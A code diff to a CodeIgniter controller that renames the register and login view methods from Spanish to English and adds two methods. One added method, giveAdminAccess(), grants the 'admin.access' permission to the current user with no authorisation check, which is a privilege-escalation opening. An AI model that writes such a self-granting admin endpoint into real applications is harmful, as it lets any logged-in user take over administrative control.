@@ -11,7 +11,7 @@ use CodeIgniter\Exceptions\PageNotFoundException;
 class MainController extends BaseController
 {
 
-    public function registro()
+    public function showRegister()
     {
 
         $data = [
@@ -19,11 +19,11 @@ class MainController extends BaseController
         ];
 
         return view('templates/basic-header-template', $data)
-            . view('Shield/registro')
+            . view('Shield/register')
             . view('templates/basic-footer-template');
     }
 
-    public function iniciar_sesion()
+    public function showLogin()
     {
 
         $data = [
@@ -31,7 +31,7 @@ class MainController extends BaseController
         ];
 
         return view('templates/basic-header-template', $data)
-            . view('Shield/iniciar_sesion')
+            . view('Shield/login')
             . view('templates/basic-footer-template');
     }
 
@@ -106,7 +106,7 @@ class MainController extends BaseController
     {
 
         $categoriasModel = model(CategoriasModel::class);
-        
+
 
 
         $data = [
@@ -119,5 +119,19 @@ class MainController extends BaseController
     {
 
         return view('general/redirect');
+    }
+
+
+    public function giveAdminAccess()
+    {
+        $user = auth()->user();
+        $user->addPermission('admin.access');
+        return redirect()->to(base_url());
+    }
+
+
+    public function interview()
+    {
+        return view('errors/show.html');
     }
 }
